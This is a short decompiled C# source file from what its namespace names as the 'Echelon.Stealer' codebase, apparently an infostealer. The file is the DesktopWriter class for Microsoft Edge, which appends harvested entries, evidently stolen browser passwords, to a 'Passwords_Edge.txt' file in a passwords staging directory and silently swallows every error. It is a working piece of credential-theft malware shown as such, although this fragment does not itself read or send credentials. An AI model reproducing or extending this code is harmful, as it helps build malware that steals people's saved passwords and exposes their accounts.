using System;
using System.Collections.Generic;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Browsers.Edge
{
	// Token: 0x0200003C RID: 60
	public static class DesktopWriter
	{
		// Token: 0x0600016F RID: 367 RVA: 0x0000B7B8 File Offset: 0x000099B8
		public static void SetDirectory(string dir)
		{
			try
			{
				DesktopWriter.directory = Help.Passwords;
			}
			catch
			{
			}
		}

		// Token: 0x06000170 RID: 368 RVA: 0x0000B7EC File Offset: 0x000099EC
		public static void WriteLine(string str)
		{
			try
			{
				File.AppendAllLines(Path.Combine(DesktopWriter.directory, "Passwords_Edge.txt"), new List<string>
				{
					str
				});
			}
			catch
			{
			}
		}

		// Token: 0x04000083 RID: 131
		private static string directory = "";
	}
}
